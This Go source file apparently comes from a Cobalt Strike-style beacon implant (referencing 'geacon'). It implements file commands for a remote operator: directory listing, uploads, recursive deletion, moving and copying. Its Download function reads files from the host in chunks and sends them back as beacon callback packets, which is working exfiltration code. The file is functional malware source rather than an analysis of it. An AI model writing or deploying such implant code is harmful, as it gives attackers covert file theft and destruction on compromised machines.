package command

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"main/packet"
	"main/util"
	"os"
	"path/filepath"
	"strings"
)

func Upload(filePath string, fileContent []byte) (int, error) {
	// normalize path
	filePath = strings.ReplaceAll(filePath, "\\", "/")
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return 0, err
	}
	defer func(fp *os.File) {
		err := fp.Close()
		if err != nil {
			return
		}
	}(fp)
	offset, err := fp.Write(fileContent)
	if err != nil {
		return 0, err
	}
	return offset, nil
}

func ChangeCurrentDir(path []byte) error {
	pathStr := strings.ReplaceAll(string(path), "\\", "/")
	err := os.Chdir(pathStr)
	if err != nil {
		return err
	}
	return nil
}

func GetCurrentDirectory() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func FileBrowse(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		return nil, err
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		return nil, err
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		return nil, err
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     geacon
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     command
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		return nil, err
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	//resultStr := fmt.Sprintf("%s/*", absCurrentDir)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	if err != nil {
		return nil, err
	}
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}
	//fmt.Println(resultStr)

	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil

}

func Download(filePath string) error {
	fileInfo, err := os.Stat(filePath)
	if err != nil {
		return err
	}
	fileLen := fileInfo.Size()
	fileLenInt := int(fileLen)
	fileLenBytes := packet.WriteInt(fileLenInt)
	requestID := util.RandomInt(10000, 99999)
	requestIDBytes := packet.WriteInt(requestID)
	result := util.BytesCombine(requestIDBytes, fileLenBytes, []byte(filePath))
	finalPaket := packet.MakePacket(CALLBACK_FILE, result)
	packet.PushResult(finalPaket)

	fileHandle, err := os.Open(filePath)
	if err != nil {
		return err
	}
	var fileContent []byte
	// 512kb
	fileBuf := make([]byte, 512*1024)
	for {
		n, err := fileHandle.Read(fileBuf)
		if err != nil && err != io.EOF {
			break
		}
		if n == 0 {
			break
		}
		fileContent = fileBuf[:n]
		result = util.BytesCombine(requestIDBytes, fileContent)
		finalPaket = packet.MakePacket(CALLBACK_FILE_WRITE, result)
		packet.PushResult(finalPaket)
	}

	finalPaket = packet.MakePacket(CALLBACK_FILE_CLOSE, requestIDBytes)
	packet.PushResult(finalPaket)
	return nil
}

func Remove(filePath string) error {
	filePath = strings.ReplaceAll(filePath, "\\", "/")
	// use RemoveAll to support remove not empty dir
	err := os.RemoveAll(filePath)
	if err != nil {
		return err
	}
	return nil
}

func MoveFile(src string, dst string) error {
	src = strings.ReplaceAll(src, "\\", "/")
	dst = strings.ReplaceAll(dst, "\\", "/")
	err := os.Rename(src, dst)
	if err != nil {
		return err
	}
	return nil
}

func CopyFile(src string, dst string) error {
	src = strings.ReplaceAll(src, "\\", "/")
	dst = strings.ReplaceAll(dst, "\\", "/")
	srcFile, err := os.Open(src)
	defer func(srcFile *os.File) {
		err := srcFile.Close()
		if err != nil {

		}
	}(srcFile)
	if err != nil {
		return err
	}
	dstFile, err := os.OpenFile(dst, os.O_RDWR|os.O_CREATE, os.ModePerm)
	defer func(dstFile *os.File) {
		err := dstFile.Close()
		if err != nil {

		}
	}(dstFile)
	if err != nil {
		return err
	}
	buf := make([]byte, 4096)
	for {
		n, err := srcFile.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		if _, err := dstFile.Write(buf[:n]); err != nil {
			return err
		}
	}
	return nil
}

func MakeDir(dir string) error {
	dir = strings.ReplaceAll(dir, "\\", "/")
	err := os.MkdirAll(dir, os.ModePerm)
	if err != nil {
		return err
	}
	return nil
}
